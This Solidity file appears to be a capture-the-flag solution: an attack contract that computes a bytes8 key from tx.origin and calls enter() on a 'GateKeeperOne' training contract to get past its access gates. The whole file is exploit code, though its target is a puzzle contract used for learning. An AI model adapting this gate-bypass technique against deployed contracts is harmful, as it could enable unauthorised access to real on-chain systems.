// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GateKeeperOneInterface {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGateKeeperOne {

    GateKeeperOneInterface gateKeeperInterface;

    constructor(address _gateKeeperOneAddress) {
        gateKeeperInterface = GateKeeperOneInterface(_gateKeeperOneAddress);
    }

    function attack() external {
        bytes8 gateKey = bytes8(uint64(uint16(uint160(tx.origin))));
        gateKeeperInterface.enter(gateKey << 46 | gateKey);
    }
}
